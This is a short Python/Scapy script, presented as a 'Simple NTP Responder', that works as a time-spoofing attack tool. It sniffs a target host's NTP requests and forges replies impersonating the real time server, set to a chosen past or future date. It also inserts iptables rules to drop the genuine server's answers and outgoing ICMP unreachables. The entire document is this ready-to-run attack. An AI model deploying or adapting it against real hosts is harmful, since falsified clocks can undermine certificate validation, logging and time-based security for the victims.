#!/usr/bin/env python3

import sys
import argparse
import os
import subprocess
import time
from scapy.all import *

parser = argparse.ArgumentParser(
    description="Simple NTP Responder"
)

parser.add_argument(
    '-s',
    dest="SRC_IP",
    type=str,
    help="The Source IP address"
)

parser.add_argument(
    '-m',
    dest="MODE",
    type=str,
    help="Possible options are \"past\", \"today\" or \"future\". Default is past"
)

args = parser.parse_args()


if os.geteuid() != 0:
    exit("\033[1;31m[!]\033[0m You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")


snifffilter = "udp dst port 123 && ip host " + args.SRC_IP


def handle_packet(packet):
    print("\033[1;34m[*]\033[0m NTP Request from " + args.SRC_IP + " recived")
    print("\033[1;34m[*]\033[0m Try to handle response")

    origdst = packet[IP].dst
    origsrcport = packet[IP].sport

    cmd = f"iptables -I INPUT -p udp -s {origdst} --source-port 123 -j DROP".split()
    subprocess.run(cmd, shell=False)
    response = (IP(dst=args.SRC_IP, src=origdst) / UDP(sport=123, dport=origsrcport) / NTP(version=4, mode=4, recv=time, orig=time, ref=time, sent=time))

    send(response)

    print("\033[1;32m[+]\033[0m Reponse to NTP Request success")

    cmd = "iptables -D INPUT 1".split()
    subprocess.run(cmd, shell=False)

    return


def handle_time():
    # (70*365 + 17)*86400 = 2208988800

    if args.MODE == "past":
        timestamp = 3407356800

    elif args.MODE == "future":
        timestamp = 4290364800

    elif args.MODE == "today":
        timestamp = 3785788800

    else:
        timestamp = 3407356800

    return timestamp


cmd = "iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -j DROP".split()
subprocess.run(cmd, shell=False)

time = handle_time()

print("\033[1;34m[*]\033[0m Waiting for NTP Request from " + args.SRC_IP)

sniff(filter=snifffilter, prn=handle_packet, store=0)

